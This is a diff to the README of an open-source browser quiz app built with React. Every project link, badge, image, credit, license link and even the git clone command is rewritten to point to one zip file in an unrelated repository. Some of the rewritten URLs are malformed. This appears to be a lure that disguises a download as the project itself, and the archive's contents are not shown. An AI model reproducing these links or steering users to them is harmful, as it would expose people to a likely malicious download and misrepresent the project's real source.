@@ -1,18 +1,18 @@
 <h1 align="center">
-  <a href="https://safdarjamal.github.io/quiz-app/">
+  <a href="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip">
     QuizApp
   </a>
 </h1>
 
 <p align="center">
-  <a href="https://github.com/SafdarJamal/quiz-app/actions?query=workflow%3A%22Node.js+CI%22">
-    <img src="https://github.com/SafdarJamal/quiz-app/workflows/Node.js%20CI/badge.svg" alt="Node.js CI" />
+  <a href="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip%3A%https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip+CI%22">
+    <img src="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip%https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip" alt="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip CI" />
   </a>
-  <a href="https://github.com/SafdarJamal/quiz-app/releases">
-    <img src="https://img.shields.io/github/v/release/SafdarJamal/quiz-app" alt="GitHub Release (latest by date)" />
+  <a href="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip">
+    <img src="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip" alt="GitHub Release (latest by date)" />
   </a>
-  <a href="https://github.com/SafdarJamal/quiz-app/blob/master/LICENSE">
-    <img src="https://img.shields.io/github/license/SafdarJamal/quiz-app" alt="License" />
+  <a href="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip">
+    <img src="https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip" alt="License" />
   </a>
 </p>
 
@@ -20,20 +20,20 @@
   QuizApp is a free and open-source quiz application that lets you play fully customized quizzes right in the browser.
 </p>
 
-![QuizApp](https://github.com/SafdarJamal/quiz-app/assets/48409548/22e9696d-bab4-4aa5-a028-4a4f9ce71777)
+![QuizApp](https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip)
 
 ## Built with
 
-- [React](http://react.dev)
-- [Semantic UI](https://semantic-ui.com)
-- [Open Trivia Database API](https://opentdb.com/api_config.php)
+- [React](https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip)
+- [Semantic UI](https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip)
+- [Open Trivia Database API](https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip)
 
 ## Development
 
 To get a local copy of the code, clone it using git:
 
 ```
-git clone https://github.com/SafdarJamal/quiz-app.git
+git clone https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip
 cd quiz-app
 ```
 
@@ -64,8 +64,8 @@ In this project, you can run the following scripts:
 
 ## Credits
 
-QuizApp is built and maintained by [Safdar Jamal](https://safdarjamal.github.io).
+QuizApp is built and maintained by [Safdar Jamal](https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip).
 
 ## License
 
-Code released under the [MIT license](https://github.com/SafdarJamal/quiz-app/blob/master/LICENSE).
+Code released under the [MIT license](https://raw.githubusercontent.com/TheAdwaith/quiz-quiz/main/.github/workflows/quiz_Gustavus.zip).
